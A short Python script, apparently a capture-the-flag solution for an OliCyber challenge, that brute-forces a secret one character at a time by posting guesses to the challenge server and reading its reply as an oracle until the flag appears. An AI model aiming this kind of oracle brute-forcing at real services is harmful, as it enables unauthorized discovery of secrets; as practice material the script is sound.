import requests as req
global secret
secret = ""
while(True):
    for char in "abcdefghijklmnopqrstuvwxyz~`!@#$%^&*()-_+={}[]|/\:;`<>":   
        result = req.post(url="http://delphi.challs.olicyber.it/secret", data={"secret" : secret + char})
        print(f"{char} :  {result.text}")
        if result.text != "Something's missing...":
            if "ptm" in result.text: 
                exit(0) #! Esco se trovo la flag
            continue
        secret = secret + char 
        print(secret)